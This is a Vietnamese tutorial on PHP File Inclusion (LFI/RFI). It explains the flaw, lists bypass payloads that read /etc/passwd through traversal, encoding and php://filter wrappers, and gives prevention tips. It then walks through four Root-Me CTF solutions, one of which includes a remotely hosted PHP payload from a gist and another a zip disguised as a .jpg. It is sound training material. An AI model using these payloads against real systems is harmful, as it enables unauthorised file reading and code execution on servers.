# Lỗ hổng File Inclusion

## Khái niệm

Lỗ hổng File Inclusion cho phép tin tặc truy cập trái phép vào những tập tin nhạy cảm trên máy chủ web hoặc thực thi các tệp tin độc hại bằng cách sử dụng chức năng “include”. Lỗ hổng này xảy ra do cơ chế kiểm tra đầu vào không được thực hiện tốt, khiến tin tặc có thể khai thác và chèn các dự liệu độc hại.

## Nguyên nhân

**Hàm `Include()`**

Trước khi nói về chi tiết lỗ hổng, chúng ta cần hiểu sơ qua về một lời gọi hàm `include()`. Toàn bộ nội dung trong một file cụ thể sẽ được sao chép vào một file khác chứa lời gọi `include`. Phương thức này được sử dụng nhằm tránh việc code lặp và có thể sử dụng bất kì lúc nào. Lập trình viên thường sử dụng hàm include() nhằm thêm những dữ liệu, tệp tin mã nguồn dùng chung của các tệp tin trong ứng dụng. Những nơi thường được sử dụng như footers, headers, menu files … Dưới đây là một ví dụ đơn giản về hàm include.

1. Một menu trang như sau
`menu.php:`
    ```php
    <?php 
        echo '
            <a href=”/home.asp”>HOME</a>
            <a href=”/details.asp”>DETAILS</a>
            <a href=”/contact.asp”>CONTACT US</a>
            ';
    ?>
    ```

2. Menu trang này có thể được sử dụng lại trong tất cả các trang của ứng dụng bằng cách dùng hàm include()
`home.php:`
    ```php
    <html>
        <body>
            <div class =”menu”>
                <?php include ‘menu.php';?>
            </div>
            <p>WELCOME</p>
        </body>
    </html>
    ```

3. Giờ thì file menu.php đã được bao hàm trong file home.php, bất cứ khi nào home.php được truy cập, nội dung trong file menu.php sẽ được sao chép vào home.php và thực thi.

    Tuy nhiên vấn đề này có thể bị tin tặc khai thác và tấn công trở lại website gây những hậu quả rất nguy hiểm. Đây là 2 lỗ hổng chính rất nguy hiểm liên quan đến hàm include()

    *Remote file inclusion*
    *Local file inclusion*
    
    Lưu ý: Trong PHP có 1 số hàm cũng có chức năng tương tự, hay các hàm do người lập trình tự viết như: Inlude_once(), require(), require_once()…
    

## Tác hại và một số cách bypass

### Local file inclusion (LFI)

Lỗ hổng Local file inclusion nằm trong quá trình include file cục bộ có sẵn trên server. Lỗ hổng xảy ra khi đầu vào người dùng chứa đường dẫn đến file bắt buộc phải include. Khi đầu vào này không được kiểm tra, tin tặc có thể sử dụng những tên file mặc định và truy cập trái phép đến chúng, tin tặc cũng có thể lợi dụng các thông tin trả về trên để đọc được những tệp tin nhạy cảm trên các thư mục khác nhau bằng cách chèn các ký tự đặc biệt như `/`,`../`, `-`.

**Local file inclusion trong PHP:**

1. giá trị của `file` được cung cấp bởi người dùng có thể bị tấn công:
    `https://victim_site/home.php?file=menu`
2. Giá trị của biến ‘file’ được lấy vào đoạn mã PHP dưới đây:
    `<?php … include($_REQUEST['file'.'.php']); … ?>`
3. Giờ thì tin tặc sẽ đưa mã độc vào biến `file` để truy cập trái phép vào file trong cùng chủ mục hoặc sử dụng kí tự duyệt chỉ mục như `../` để di chuyển đến chỉ mục khác. Ví dụ tin tặc lấy được log bằng cách cung cấp đầu vào `/apache/logs/error.log` hoặc `/apache/logs/access.log` hay việc đánh cắp dữ liệu liên quan đến tài khoản của người dùng thông qua `../../etc/passwd` trên hệ thống Unix.
      
### Remote file inclusion (RFI)

RFI cho phép tin tặc include và thực thi trên máy chủ mục tiêu một tệp tin được lưu trữ từ xa. Tin tặc có thể sử dụng RFI để chạy một mã độc trên cả máy của người dùng và phía máy chủ. Ảnh hưởng của kiểu tấn công này thay đổi từ đánh cắp tạm thời session token hoặc các dữ liệu của người dùng cho đến việc tải lên các webshell, mã độc nhằm đến xâm hại hoàn toàn hệ thống máy chủ.

**Remote file inclusion trong PHP:**
1. Ví dụ giá trị của `file` được cung cấp bởi người dùng có thể bị tấn công:
    `www.victim_site.com/home.php?file=menu`
2. Giá trị của biến ‘file’ được lấy vào đoạn mã PHP dưới đây:
    `<?php … include($_REQUEST['file'.'.php']); … ?>`
3. Giờ thì tin tặc sẽ đưa mã độc vào biến `file`:
    `www.victim_site.com/home.php?test=https://www.attacker_site.com/shell`
    File `shell` được bao hàm vào trang có sẵn trên máy chủ và thực thi mỗi khi trang `home.php` được truy cập. Tin tặc sẽ đưa mã độc vào `shell` và thực hiện hành vi độc hại.
    

### Một số cách bypass:

**Traversal sequences stripped non-recursively:**
```
https://victim_site/home.php?file=....//....//....//etc/passwd
https://victim_site/home.php?file=....\/....\/....\/etc/passwd
http://victim_site/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
**Null byte (%00):**
```
https://victim_site/home.php?file=../../../../etc/passwd%00
```
**Encoding:**
```
https://victim_site/home.php?file=..%252f..%252f..%252fetc%252fpasswd
https://victim_site/home.php?file=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
https://victim_site/home.php?file=%252e%252e%252fetc%252fpasswd
https://victim_site/home.php?file=%252e%252e%252fetc%252fpasswd%00
```
**Path and dot truncation:**
```
https://victim_site/home.php?file=../../../etc/passwd............[ADD MORE]
https://victim_site/home.php?file=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
https://victim_site/home.php?file=../../../etc/passwd/./././././.[ADD MORE] 
https://victim_site/home.php?file=../../../[ADD MORE]../../../../etc/passwd
```
**Filter bypass tricks:**
```
https://victim_site/home.php?file=....//....//etc/passwd
https://victim_site/home.php?file=..///////..////..//////etc/passwd
https://victim_site/home.php?file=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
```
**Using wrappers:**
```
https://victim_site/home.php?file=php://filter/read=string.rot13/resource=index.php
https://victim_site/home.php?file=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
https://victim_site/home.php?file=php://filter/convert.base64-encode/resource=index.php
https://victim_site/home.php?file=pHp://FilTer/convert.base64-encode/resource=index.php
```

## Cách phòng chống

Lỗ hổng xảy ra khi việc kiểm tra đầu vào không được chú trọng. Khuyến cáo riêng thì không nên hoặc hạn chế tới mức tối thiểu phải sử dụng các biến từ "User Input" để đưa vào hàm `include()` hay `eval()`.  Trong trường hợp phải sử dụng. với các thông tin được nhập từ bên ngoài, trước khi đưa vào hàm cần được kiểm tra kỹ lưỡng

1. Chỉ chấp nhận kí tự và số cho tên file (A-Z 0-9). Blacklist toàn bộ kí tự đặc biệt không được sử dụng.
2. Giới hạn API cho phép việc include file từ một chỉ mục xác định nhằm tránh directory traversal.

Tấn công File Inclusion có thể nguy hiểm hơn cả SQL Injection do đó thực sự cần thiết phải có những biện pháp khắc phục lỗ hổng này. Kiểm tra dữ liệu đầu vào hợp lý là chìa khóa để giải quyết vấn đề.


## So sánh Path Traversal và File Inclusion


|    So sánh      | Path Traversal | File Inclusion |
| --------------- | -----------    | -------------- |
| Định nghĩa      | Lỗ hổng Path Traversal xảy ra khi ứng dụng hoặc máy chủ web cung cấp cho người dùng khả năng **đọc** các tệp ở một vị trí hệ thống nội bộ mà lẽ ra không thể truy cập được. Nó giúp attacker **đọc** một số tệp quan trọng.        | Lỗ hổng File Inclusion xảy ra khi đầu vào của người dùng được sử dụng trực tiếp trong file được include mà không có bất kỳ bộ lọc nào, File đó sẽ được **đọc và thực thi** tại nơi nó được include . Nó giúp attacker include file hắn muốn **đọc và thực thi** ở local hoặc remote. |
| Tác hại       | Tác động của lỗ hổng này trong hầu hết các trường hợp là **không trực tiếp**, vì hầu hết thời gian và tất cả những gì chúng ta có thể làm với lỗ hổng này là đọc tệp. Việc **đọc** các tệp được giúp **thu thập thông tin** quan trọng về các chức năng của ứng dụng hoặc hệ thống và các lỗ hổng tiềm ẩn có thể xảy ra.           | Tác động của lỗ hổng này là **trực tiếp**. Việc **thực thi** được các codes **trực tiếp** trong ứng dụng có thể dẫn đến các cuộc tấn công nghiêm trọng khác như: RCE, XSS, ... |


# Lab File Inclusion:

Link to lab: https://github.com/tu3n4nh/trainingKCSC/tree/main/task_7_file_inclusion/lab_file_inclusion


# Root me

## Root me/Local File Inclusion

![](https://i.imgur.com/dsEMfAS.png)

Link to chall: https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion

### Phân tích

Khi click vào một trong số những link ở trên:

`http://challenge01.root-me.org/web-serveur/ch16/`

![](https://i.imgur.com/yGRm8kx.png)

Em nhận được các file có trong folder đó:

`http://challenge01.root-me.org/web-serveur/ch16/?files=sysadm`

![](https://i.imgur.com/QrErM95.png)

Click vào từng file em nhận được source code của nó:

`http://challenge01.root-me.org/web-serveur/ch16/?files=sysadm&f=index.html`

![](https://i.imgur.com/tDaJn70.png)

Có vẻ như biến `files` dùng để xác định folder chứa các file sẽ hiện ra cho em nên em thử dùng path traversal (`../`) để về thư mục cha xem nó chứa những gì và em nhận được kết quả là:

![](https://i.imgur.com/cU3g9TB.png)

### Khai thác

Sau khi fuzz em biết được rằng đường dẫn mặc định là trỏ tới folder `files` vậy nên giờ để bắt đầu khai thác em cần vô folder admin xem ở đó có những gì:

`http://challenge01.root-me.org/web-serveur/ch16/?files=../admin`

Và em nhận được:

![](https://i.imgur.com/Xs37OpY.png)

Đọc file `index.php` của folder `admin` và em nhận được thông tin đăng nhập được hardcode:

![](https://i.imgur.com/GTrmqYt.png)

Sử dụng thông tin đó để đăng nhập để solve chall.


## Root me/Local File Inclusion - Double encoding

![](https://i.imgur.com/sMpmN00.png)

Link to chall: https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Double-encoding

### Phân tích

![](https://i.imgur.com/UzpXBWk.png)

Truy cập vào chall em thấy giao diện khá giống với bài trước, dựa theo tên bài em test bằng path traversal cơ bản như bài trước nhưng không được kết quả gì cả :cry: vì em chưa biết được tên file.

Để biết được server trả về cho em code php như thế nào em sử dụng Wrapper `php://filter` để đọc source trả về khi em vào page `/home`

### Khai thác

Payload: `php%253A%252F%252Ffilter%252Fconvert%252ebase64-encode%252Fresource%253Dhome`

![](https://i.imgur.com/iDkOnmZ.png)

Em nhận về được đoạn code (là code php mà trang web sử dụng để render ra giao diện web) đã encode base64.

Decode đoạn base64 trên em thu được đoạn code sau:

![](https://i.imgur.com/UCahYHN.png)

Vậy là khi click vào `/home` page thì web sẽ trả về cho ta nội dung của key `home` trong file `conf.inc.php`.

Vẫn sử dụng payload như trên nhưng thay `home` = `conf` để đọc code của file `conf`:

Payload: `php%253A%252F%252Ffilter%252Fconvert%252ebase64-encode%252Fresource%253Dconf`

Decode đoạn base64 nhận được và em thu được flag:

![](https://i.imgur.com/aEkIAKG.png)


## Root me/Remote File Inclusion

![](https://i.imgur.com/SwxAXxS.png)

Link to chall: https://www.root-me.org/en/Challenges/Web-Server/Remote-File-Inclusion

### Phân tích

Truy cập vào chall em nhận được trang index.php như sau:

![](https://i.imgur.com/M6GO7Zp.png)

Thử thay đổi params `lang` thành `aa`:

![](https://i.imgur.com/z7zvQNs.png)

Em thấy lỗi `include(aa_lang.php): failed to open` có vẻ như file ta nhập vào sẽ được nối với đuôi `_lang.php` rồi sau đó được `include()`

Vì tên bài là Remote File Inclusion và statement là Get the PHP source code. Nên em đi thẳng đến bước khai thác luôn

### Khai thác

Đầu tiên em lên `gist.github.com` tạo file php với tên là `shell_lang.php` chứa payload show source code: `<?php show_source("index.php") ?>`

Lấy link file gist đó rồi thay vào params `lang`:

Payload: `http://challenge01.root-me.org/web-serveur/ch13/?lang=https://gist.githubusercontent.com/tu3n4nh/c12844cd946cd0d9f1211a7c343363e7/raw/4b39b1c5a218ecb972db2d2b83bba1c9424a779b/shell`

Và thế là em có flag:

![](https://i.imgur.com/Ma8LYQ0.png)



## Root me/Local File Inclusion - Wrappers

![](https://i.imgur.com/Sp2bvz4.png)

Link to chall: https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Wrappers

### Phân tích

![](https://i.imgur.com/U0A6HP1.png)

Vào chall em nhận được một form upload chỉ cho phép upload file ảnh `.jpg`. Upload thử file ảnh bất kỳ để xem cách thức hoạt động của website

![](https://i.imgur.com/mBRwo75.png)

Sau khi ảnh được upload nó được chuyển vào folder `/tmp/upload` và được đặt một tên bất kỳ `IbE0W0Tna.jpg`

![](https://i.imgur.com/Z1ghZCA.png)

Vậy là em có thể tạm xác định website gồm:

```
┐
├─index.php // Chứa form upload
├─view.php  // File view được include vào file index để
└─tmp
   └upload  // Chứa các file .jpg được tải lên
```

Vì em có thể upload file và file đó phải là `.jpg` nên em sử dụng payload này: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-zip

### Khai thác

1. Đầu tiên em tạo 1 file `a.php` để show source file `index.php` như sau: 
    `<?php show_source('index.php') ?>`
2. Tạo 1 file zip chứa file `a.php` vừa tạo:
    `$ zip payload.zip a.php`
3. Đổi tên file zip đó thành `.jpg`:
    `$ mv payload.zip shell.jpg`
4. Upload file `shell.jpg` và truy cập vào file với đường dẫn `page=zip://tmp/upload/[tên file được tạo ngẫu nhiên]%23a` (`a` ở đây là tên của file `a.php` bên trong file zip):

    ![](https://i.imgur.com/HDGkrnr.png)

5. Sau khi đọc source code không có gì em tiếp tục tìm kiếm file chứa flag bằng payload: `<?php print_r(scandir('.')); ?>`
6. Và em thu được file `flag-mipkBswUppqwXlq9ZydO.php`:

    ![](https://i.imgur.com/9U9ALn7.png)

7. Thay payload thành show file flag: `<?php show_source("flag-mipkBswUppqwXlq9ZydO.php"); ?>`
8. Upload file và truy cập tương tự và em đã có được flag:

    ![](https://i.imgur.com/vdwTY19.png)

